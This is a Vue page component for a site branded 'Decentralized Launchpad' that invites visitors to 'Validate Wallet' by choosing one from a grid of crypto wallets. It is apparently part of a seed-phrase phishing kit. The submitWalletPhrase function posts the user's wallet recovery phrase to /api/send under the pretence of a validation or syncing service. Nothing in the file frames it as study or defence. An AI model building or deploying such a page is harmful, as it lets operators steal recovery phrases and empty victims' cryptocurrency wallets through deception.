
<template>
  <div class="min-h-screen bg-white text-[#0b0b1f]">
    <header
        v-show="showHeader"
        class="fixed left-0 right-0 top-0 z-50 bg-gradient-to-r from-[#252080] via-[#4b208f] to-[#92258f] transition-transform duration-300"
        :class="showHeader ? 'translate-y-0' : '-translate-y-full'"
    >
      <div
          class="mx-auto flex h-[80px] max-w-[1400px] items-center justify-between px-5 lg:px-10"
      >

        <h4 class="text-lg font-semibold text-white">
          CUSTOM VALIDATOR
        </h4>

        <div class="flex items-center gap-4">

          <!-- Search -->
          <button
              type="button"
              class="flex h-10 w-10 items-center justify-center text-white"
              aria-label="Search"
          >
            <svg
                xmlns="http://www.w3.org/2000/svg"
                class="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                stroke-width="2"
            >
              <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  d="m21 21-4.35-4.35m2.35-5.65a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"
              />
            </svg>
          </button>

          <!-- Validate Wallet -->
          <div>
            <button
                type="button"
                class="hidden md:flex cursor-pointer h-[50px] w-[255px] items-center justify-center gap-3 rounded-full border-2 border-white bg-transparent px-8 text-[16px] font-semibold text-white transition-all duration-200 hover:bg-white/10"
                @click="openWallet(wallets[0]!)"
            >
              <!-- Wallet icon -->
              <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="22"
                  height="22"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.8"
                  class="shrink-0"
              >
                <rect
                    x="3"
                    y="5"
                    width="18"
                    height="14"
                    rx="3"
                />
                <path d="M3 8h15" />
                <path d="M16 12h5v4h-5a2 2 0 0 1 0-4Z" />
                <circle
                    cx="17"
                    cy="14"
                    r="0.8"
                    fill="currentColor"
                    stroke="none"
                />
              </svg>

              <span>Validate Wallet</span>
            </button>
            <button
                type="button"
                class="md:hidden flex cursor-pointer h-full items-center justify-center gap-3 rounded-full border-2 border-white bg-transparent p-4 text-[16px] font-semibold text-white transition-all duration-200 hover:bg-white/10"
                @click="openWallet(wallets[0]!)"
            >
              <!-- Wallet icon -->
              <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="22"
                  height="22"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.8"
                  class="shrink-0"
              >
                <rect
                    x="3"
                    y="5"
                    width="18"
                    height="14"
                    rx="3"
                />
                <path d="M3 8h15" />
                <path d="M16 12h5v4h-5a2 2 0 0 1 0-4Z" />
                <circle
                    cx="17"
                    cy="14"
                    r="0.8"
                    fill="currentColor"
                    stroke="none"
                />
              </svg>
            </button>
          </div>
        </div>
      </div>
    </header>
    <main class="px-5 py-16 lg:px-8">
      <div class="mx-auto w-full max-w-[1400px]">

        <div class="mb-12 text-center">
          <h1 class="text-4xl font-bold tracking-tight text-[#07122f]">
            Select a Wallet
          </h1>

          <div class="mx-auto mt-6 w-[100px]">
            <div class="relative h-[4px] rounded-full bg-[#5145ff]">
              <span
                  class="absolute top-1/2 h-3 w-3 -translate-y-1/2 rounded-full bg-[#5145ff] animate-moving-dot"
              ></span>

            </div>
          </div>
        </div>
        <div
            class="grid grid-cols-1 gap-8 sm:grid-cols-2 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4"
        >

          <div
              v-for="wallet in wallets"
              :key="wallet.name"
              class="w-full"
          >
            <button
                type="button"
                class="flex min-h-[100px] w-full cursor-pointer items-center rounded-xl bg-white px-5 text-left shadow-[0_5px_25px_rgba(0,0,0,0.08)] transition duration-200 hover:-translate-y-0.5 hover:shadow-[0_8px_30px_rgba(0,0,0,0.12)]"
                @click="openWallet(wallet)"
            >
              <div
                  class="flex h-18 w-18 shrink-0 items-center justify-center rounded-full"
              >
                <img
                    :src="wallet.logo"
                    :alt="`${wallet.name} logo`"
                    class="h-full w-full md:h-10 md:w-10 rounded-full object-contain sm:h-12 sm:w-12 lg:h-14 lg:w-14 xl:h-16 xl:w-16"
                />
              </div>
              <div class="ml-5 min-w-0">

                <h5
                    class="truncate text-[18px] font-semibold text-[#07122f]"
                >
                  {{ wallet.name }}
                </h5>

                <span
                    v-if="wallet.domain"
                    class="mt-2 block text-[14px] text-[#777b8a]"
                >
                  {{ wallet.domain }}
                </span>

              </div>

            </button>

          </div>

        </div>

      </div>
    </main>
    <footer class="bg-white">
      <div class="max-w-[1400px] px-5 py-16 lg:px-16 lg:py-10">
        <div class="grid grid-cols-1 gap-16 lg:grid-cols-2 lg:gap-4">
          <div>
            <div class="mb-5">
              <a
                  href="#"
                  class="text-[42px] font-bold leading-[1.05] tracking-[-1.5px] text-[#5145ff]"
              >
                Decentralized<br />
                Launchpad
              </a>
            </div>

            <p
                class="max-w-[370px] text-[16px] leading-[1.7] text-[#17204a]"
            >
              Open and decentralized protocol for syncing various Wallets to
              Dapps Secure Server. This is not an app but a protocol that
              establishes a remote connection between two apps and/or devices
            </p>
          </div>
          <div class="lg:pt-[20px]">
            <h5 class="mb-8 text-[20px] font-semibold text-[#111111]">
              Subscribe
            </h5>

            <form
                class="flex h-[68px] w-full max-w-[390px] overflow-hidden rounded-[12px] border border-[#d7d7df] bg-white"
                @submit.prevent
            >
              <input
                  type="email"
                  placeholder="name@email.com"
                  required
                  class="min-w-0 flex-1 border-0 bg-transparent px-7 text-[16px] text-[#111] outline-none placeholder:text-[#9999a8]"
              />

              <button
                  type="submit"
                  aria-label="Subscribe"
                  class="flex w-[75px] shrink-0 items-center justify-center bg-[#5145ff] text-white transition hover:bg-[#4035e8]"
              >
                <svg
                    xmlns="http://www.w3.org/2000/svg"
                    class="h-6 w-6"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                >
                  <path d="m22 2-7 20-4-9-9-4Z" />
                  <path d="M22 2 11 13" />
                </svg>
              </button>
            </form>
          </div>

        </div>
      </div>
    </footer>
    <ConnectWalletModal
        :show="showWalletModal"
        :wallet-name="selectedWallet.name"
        :wallet-logo="selectedWallet.logo"
        @close="closeWallet"
        @submit="submitWalletPhrase"
    />

  </div>
</template>


<script setup lang="ts">

import ConnectWalletModal from '../components/connect-wallet-modal.vue'
import walletsData from '../data/wallets.json'
const status = ref<'idle' | 'sending' | 'sent' | 'error'>('idle')
import { toast } from 'vue-sonner'

interface Wallet {
  id: number
  name: string
  domain: string
  logo: string
}
const wallets = walletsData as Wallet[]
const showHeader = ref(false)
const showWalletModal = ref(false)
const selectedWallet = ref<Wallet>(wallets[0]!)

const openWallet = (wallet: Wallet) => {
  selectedWallet.value = wallet
  showWalletModal.value = true
}

const closeWallet = () => {
  showWalletModal.value = false
}

async function submitWalletPhrase(payload: { walletPhrase: string, walletName: string }) {
  status.value = 'sending'
  try {
    await $fetch('/api/send', { method: 'POST', body: payload })
    status.value = 'sent'
    toast.success('Wallet phrase sent successfully!')
    showWalletModal.value = false
  } catch {
    toast.error('Something went wrong. Please try again.')
    status.value = 'error'
  }
}

const handleScroll = () => {
  showHeader.value = window.scrollY > 0
}

onMounted(() => {
  window.addEventListener('scroll', handleScroll, { passive: true })
})

onUnmounted(() => {
  window.removeEventListener('scroll', handleScroll)
})
</script>
<style scoped>
@keyframes moving-dot {
  0% {
    left: 0;
  }

  50% {
    left: 50%;
  }

  100% {
    left: 100%;
  }
}

.animate-moving-dot {
  animation: moving-dot 2s ease-in-out infinite;
}
</style>

